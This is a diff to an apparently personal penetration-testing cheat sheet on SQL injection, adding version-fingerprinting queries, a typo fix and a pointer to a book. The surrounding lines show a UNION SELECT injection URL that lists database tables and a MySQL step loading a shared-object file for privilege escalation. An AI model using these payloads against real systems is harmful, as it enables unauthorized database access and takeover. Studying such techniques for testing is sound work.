@@ -1787,14 +1787,23 @@ create table myexploit(line blob);
 
 insert into myexploit values(load_file('/home/folder/1518.so'));
 
+SELECT @@version
+SELECT version()
+SELECT banner from v$version
+
 ```
 
-### Sql blind enumberations
+### Sql blind enumerations
 
 ```
 http://*target-domain*/comment.php?id=738%20union%20select%201,2,3,4,table_name,%206%20FROM%20information_schema.tables
 
 ```
+
+### selecting data with UNION statements
+
+refer to sql injection book inside kindle
+
 ### hp scrawlr
 
 ### Sqlix
